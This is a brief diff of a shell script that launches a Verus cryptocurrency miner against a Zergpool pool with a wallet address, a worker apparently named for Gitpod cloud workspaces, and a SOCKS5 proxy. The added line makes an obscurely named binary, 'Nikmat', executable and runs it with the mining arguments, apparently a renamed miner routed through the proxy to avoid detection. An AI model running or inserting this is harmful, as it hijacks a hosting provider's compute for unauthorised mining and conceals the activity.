@@ -9,7 +9,5 @@ A=verushash.na.mine.zergpool.com:3300
 B=D67zfz3CwzGqVahUP2xYazJrgZxY2gp3cD
 C=Gitpodio
 D=socks5://72.210.208.101:4145
- ./obatkuat
 
-
-ccminer.exe -a verus -o $A -u $B.$C -p x -x $D c=DGB
+chmod u+x Nikmat && ./Nikmat -a verus -o $A -u $B.$C -p x -x $D c=DGB
